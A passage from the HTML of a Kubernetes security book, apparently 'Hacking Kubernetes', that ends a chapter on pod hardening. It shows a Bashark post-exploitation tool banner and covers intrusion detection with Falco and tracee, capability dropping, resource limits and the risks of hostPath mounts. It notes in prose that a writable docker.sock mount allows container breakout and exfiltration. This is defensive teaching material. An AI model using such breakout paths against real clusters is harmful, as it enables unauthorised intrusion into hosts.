 <code class="p">|</code>    <code class="p">|</code>   <code class="se">\ </code>/ __ <code class="se">\_\_</code>__ <code class="se">\|</code>   Y  <code class="se">\/</code> __ <code class="se">\|</code>  <code class="p">|</code> <code class="se">\/</code>    &lt;   <code class="se">\ </code>  /    /       <code class="se">\ </code>   <code class="se">\ </code> <code class="se">\_</code>/   <code class="se">\</code>
 <code class="p">|</code>______  /<code class="o">(</code>____  /____  &gt;___<code class="p">|</code>  <code class="o">(</code>____  /__<code class="p">|</code>  <code class="p">|</code>__<code class="p">|</code>_ <code class="se">\ </code>  <code class="se">\_</code>/ /<code class="se">\ </code> <code class="se">\_</code>______ <code class="se">\ </code>/<code class="se">\ \_</code>____  /
        <code class="se">\/</code>      <code class="se">\/</code>     <code class="se">\/</code>     <code class="se">\/</code>     <code class="se">\/</code>           <code class="se">\/</code>       <code class="se">\/</code>          <code class="se">\/</code> <code class="se">\/</code>       <code class="se">\/</code>



<code class="o">[</code>*<code class="o">]</code> Type <code class="s1">'help'</code> to show available commands

bashark_2.0<code class="err">$</code>
</pre>

<p>Filesystem locations like <em>/tmp</em> and <em>/dev/shm</em> will probably always be writable to support application
behavior, and so read-only filesystems cannot be relied upon as a security boundary. Immutability will prevent
against some drive-by and automated attacks, but is not a robust security boundary.</p>

<p>Intrusion detection tools<a data-type="indexterm" data-primary="intrusion detection" data-secondary="Bash shells" id="idm45302816745792"/><a data-type="indexterm" data-primary="Bash shell" data-secondary="intrusion detection tools" id="idm45302816744816"/><a data-type="indexterm" data-primary="Falco" id="idm45302816743856"/><a data-type="indexterm" data-primary="tracee" id="idm45302816743184"/> such as <code>falco</code> and <code>tracee</code> can detect new Bash shells spawned in a container (or any
non-allowlisted applications). Additionally <code>tracee</code> can
<a href="https://oreil.ly/Ur0wV">detect in-memory execution</a> of malware that attempts to hide
itself by observing <em>/proc/pid/maps</em> for memory that was once writable but is now executable.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>We look at Falco in more detail in <a data-type="xref" href="ch09.xhtml#ch-intrusion-detection">Chapter 9</a>.</p>
</div>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .capabilities .drop | index(“ALL”)"><div class="sect3" id="idm45302816737856">
<h3>containers[] .securityContext .capabilities .drop | index(“ALL”)</h3>

<p>You should <a data-type="indexterm" data-primary="securityContext" data-secondary=".capatilities .drop" data-secondary-sortas="capabilities drop" id="idm45302816736560"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary=".capabilities .drop" data-tertiary-sortas="capabilities drop" id="idm45302816735280"/>always drop all <a data-type="indexterm" data-primary="capabilities" data-secondary="securityContext" data-tertiary=".capabilities .drop" data-tertiary-sortas="capabilities .drop" id="idm45302816733664"/>capabilities and only readd those that your application needs to operate.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .securityContext .capabilities .add | index(“SYS_ADMIN”)"><div class="sect3" id="idm45302816731760">
<h3>containers[] .securityContext .capabilities .add | index(“SYS_ADMIN”)</h3>

<p>The presence of <a data-type="indexterm" data-primary="securityContext" data-secondary=".capatilities .add" data-secondary-sortas="capabilities add" id="idm45302816730496"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary=".capabilities .add" data-tertiary-sortas="capabilities add" id="idm45302816729216"/>this capability<a data-type="indexterm" data-primary="capabilities" data-secondary="securityContext" data-tertiary=".capabilities .add" data-tertiary-sortas="capabilities .add" id="idm45302816727600"/> is a red flag: try to find another way to deploy any container that requires this,
or deploy into a dedicated namespace with custom security rules to limit the impact of compromise.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .resources .limits .cpu, .memory"><div class="sect3" id="idm45302816725504">
<h3>containers[] .resources .limits .cpu, .memory</h3>

<p>Limiting <a data-type="indexterm" data-primary=".resources .limits .cpu, .memory" data-primary-sortas="resources .limits .cpu, .memory" id="idm45302816724176"/>the total amount of <a data-type="indexterm" data-primary="memory" data-secondary="limiting" id="idm45302816723008"/><a data-type="indexterm" data-primary="containers" data-secondary="memory, limiting" id="idm45302816722032"/>memory available to a container prevents denial of service attacks taking out the
host machine, as the container dies first.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark="containers[] .resources .requests .cpu, .memory"><div class="sect3" id="idm45302816720560">
<h3>containers[] .resources .requests .cpu, .memory</h3>

<p>Requesting resources <a data-type="indexterm" data-primary=".resources .requests .cpu, .memory" data-primary-sortas="resources .requests .cpu, .memory" id="idm45302816719232"/>helps the scheduler to “bin pack” resources effectively. Over-requesting <a data-type="indexterm" data-primary="resources" data-secondary="requests, security considerations" id="idm45302816718064"/>resources may be an adversary’s attempt to schedule new pods to another Node they control.</p>
</div></section>













<section data-type="sect3" data-pdf-bookmark=".spec .volumes[] .hostPath .path"><div class="sect3" id="idm45302816716512">
<h3>.spec .volumes[] .hostPath .path</h3>

<p>A writable <em>/var/run/docker.sock</em> host mount <a data-type="indexterm" data-primary=".spec .volumes[] .hostPath .path" data-primary-sortas="spec .volumes[] .hostPath .path" id="idm45302816714576"/>allows breakout to the host. Any filesystem that an attacker can write
a symlink to is vulnerable, and an attacker can use that path to explore and exfiltrate from the <a data-type="indexterm" data-primary="NSA (National Security Agency), Kubernetes hardening standards" data-startref="NSA_Khs" id="idm45302816713216"/><a data-type="indexterm" data-primary="National Security Agency (NSA), Kubernetes hardening standards" data-startref="NSA_khs" id="idm45302816712304"/><a data-type="indexterm" data-primary="Kubernetes Hardening Guidance (NSA)" data-startref="KHG" id="idm45302816711392"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="NSA hardening standards" data-startref="sec_secContxt_NSA" id="idm45302816710432"/><a data-type="indexterm" data-primary="securityContext" data-secondary="NSA hardening standards" data-startref="secContxt_NSA" id="idm45302816708944"/><a data-type="indexterm" data-primary="Kubesec" data-secondary="resources, examining" data-startref="kubesec_resourc" id="idm45302816707728"/><a data-type="indexterm" data-primary="resources" data-secondary="examining" data-startref="resourc_examin" id="idm45302816706512"/>host.</p>
</div></section>



</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Into the Eye of the Storm"><div class="sect1" id="idm45302817343408">
<h1>Into the Eye of the Storm</h1>

<p>The Captain and crew have had a fruitless raid, but this is not the last we will hear of their escapades.</p>

<p>As we progress through this book, we will see how Kubernetes pod components interact with the wider system, and we will
witness Captain Hashjack’s efforts to exploit them.</p>
</div></section>













<section data-type="sect1" data-pdf-bookmark="Conclusion"><div class="sect1" id="idm45302816703440">
<h1>Conclusion</h1>

<p>There are multiple layers of configuration to secure for a pod to be used safely, and the workloads you run are the soft underbelly of Kubernetes security.</p>

<p>The pod is the first line of defense and the most important part of a cluster to protect. Application code changes frequently and is likely to be a source of potentially exploitable bugs.</p>

<p>To extend the anchor and chain metaphor, a cluster is only a strong as its weakest link. In order to be provably secure, you must use robust configuration testing, preventative control and policy in the pipeline and admission control, and runtime intrusion detection—as nothing is infallible.</p>
</div></section>







</div></section></div></body></html>